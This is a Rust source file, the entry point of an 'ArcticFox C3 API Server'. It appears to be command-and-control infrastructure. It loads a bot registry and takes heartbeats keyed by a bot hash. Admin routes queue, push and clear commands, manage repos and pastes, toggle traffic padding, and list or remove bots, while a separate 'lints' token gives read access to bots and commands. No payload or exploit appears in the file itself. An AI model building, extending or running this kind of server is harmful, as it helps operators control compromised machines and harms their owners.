//! ArcticFox C3 API Server — main entry point.

use axum::{routing::{delete, get, post, put}, Router};
use clap::Parser;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;
use tracing::{error, info, warn};
use tracing_subscriber::EnvFilter;

use arcticfox_api::{AppState, routes_admin, routes_lints};

/// ArcticFox C3 API Server
#[derive(Parser)]
#[command(name = "arcticfox-api", version, about)]
struct Cli {
    /// Host to bind to
    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    /// Port to listen on
    #[arg(long, default_value_t = 7443)]
    port: u16,

    /// Path to API config file
    #[arg(long, default_value = "api_config.json")]
    api_config: PathBuf,

    /// Path to control config file
    #[arg(long, default_value = "control_config.json")]
    control_config: PathBuf,

    /// Path to bots file
    #[arg(long, default_value = "bots.json")]
    bots_file: PathBuf,

    /// Generate new tokens
    #[arg(long)]
    gen_tokens: bool,

    /// Enable debug mode
    #[arg(long)]
    debug: bool,
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    // Initialize tracing
    let filter = if cli.debug {
        EnvFilter::new("debug")
    } else {
        EnvFilter::new("arcticfox_api=info,arcticfox_core=warn")
    };
    tracing_subscriber::fmt()
        .with_env_filter(filter)
        .with_target(false)
        .init();

    // Load configs
    let mut api_config = match arcticfox_core::config::ApiConfig::load_or_init(&cli.api_config) {
        Ok(cfg) => cfg,
        Err(e) => {
            error!("Failed to load API config: {e}");
            std::process::exit(1);
        }
    };

    if cli.gen_tokens {
        api_config.admin_token = arcticfox_core::crypto::generate_token();
        api_config.lints_token = arcticfox_core::crypto::generate_token();
        if let Err(e) = api_config.save(&cli.api_config) {
            error!("Failed to save new tokens: {e}");
            std::process::exit(1);
        }
        println!("Admin token: {}", api_config.admin_token);
        println!("Lints token: {}", api_config.lints_token);
        return;
    }

    // Print tokens on first run
    if api_config.admin_token.is_empty() || api_config.lints_token.is_empty() {
        api_config.admin_token = arcticfox_core::crypto::generate_token();
        api_config.lints_token = arcticfox_core::crypto::generate_token();
        if let Err(e) = api_config.save(&cli.api_config) {
            error!("Failed to save tokens: {e}");
        }
    }

    let control_config = match arcticfox_core::config::ControlConfig::load(&cli.control_config) {
        Ok(cfg) => cfg,
        Err(e) => {
            error!("Failed to load control config: {e}");
            std::process::exit(1);
        }
    };

    // Create app state
    let state = match AppState::new(api_config.clone(), control_config) {
        Ok(s) => Arc::new(s),
        Err(e) => {
            error!("Failed to initialize app state: {e}");
            std::process::exit(1);
        }
    };

    // Load existing bots
    state.load_bots(&cli.bots_file).await;

    // Build routes
    let app = Router::new()
        // Public
        .route("/api/heartbeat/{bot_hash}", get(routes_lints::heartbeat_receiver).post(routes_lints::heartbeat_receiver))
        .route("/api/auth/whoami", get(routes_lints::whoami))
        // Admin
        .route("/api/admin/repos", get(routes_admin::list_repos).post(routes_admin::add_repo))
        .route("/api/admin/repos/{idx}", delete(routes_admin::remove_repo))
        .route("/api/admin/repos/check", post(routes_admin::check_repos))
        .route("/api/admin/commands", get(routes_admin::list_commands).post(routes_admin::add_command).delete(routes_admin::clear_commands))
        .route("/api/admin/commands/{idx}", delete(routes_admin::remove_command))
        .route("/api/admin/push", post(routes_admin::push))
        .route("/api/admin/pull/{idx}", get(routes_admin::pull))
        .route("/api/admin/preview", get(routes_admin::preview))
        .route("/api/admin/paste", post(routes_admin::create_paste))
        .route("/api/admin/heartbeat", get(routes_admin::get_heartbeat).put(routes_admin::set_heartbeat))
        .route("/api/admin/tokens", put(routes_admin::set_tokens))
        .route("/api/admin/padding", put(routes_admin::toggle_padding))
        .route("/api/admin/config/save", post(routes_admin::save_config))
        .route("/api/admin/bots", get(routes_admin::list_bots))
        .route("/api/admin/bots/{bot_id}", delete(routes_admin::remove_bot))
        .route("/api/admin/stats", get(routes_admin::stats))
        // Lints
        .route("/api/lints/status", get(routes_lints::lints_status))
        .route("/api/lints/bots", get(routes_lints::lints_bots))
        .route("/api/lints/repos", get(routes_lints::lints_repos))
        .route("/api/lints/commands", get(routes_lints::lints_commands))
        .with_state(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .parse()
        .unwrap_or_else(|_| "0.0.0.0:7443".parse().unwrap());

    // Print startup banner
    println!("\n╔═════════════════════════════════════════════╗");
    println!("║  ArcticFox C3 API Server v{}        ║", env!("CARGO_PKG_VERSION"));
    println!("╠═════════════════════════════════════════════╣");
    println!("║  Listening: {:<33}║", addr.to_string());
    println!("║  Admin token: {:<30}║", &api_config.admin_token[..api_config.admin_token.len().min(30)]);
    println!("║  Lints token: {:<30}║", &api_config.lints_token[..api_config.lints_token.len().min(30)]);
    println!("║  WARNING: No TLS — tokens in cleartext!  ║");
    println!("╚═════════════════════════════════════════════╝\n");

    info!("API server starting on {}", addr);

    let listener = match tokio::net::TcpListener::bind(&addr).await {
        Ok(l) => l,
        Err(e) => {
            error!("Failed to bind to {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    if let Err(e) = axum::serve(listener, app).await {
        error!("Server error: {e}");
        std::process::exit(1);
    }
}
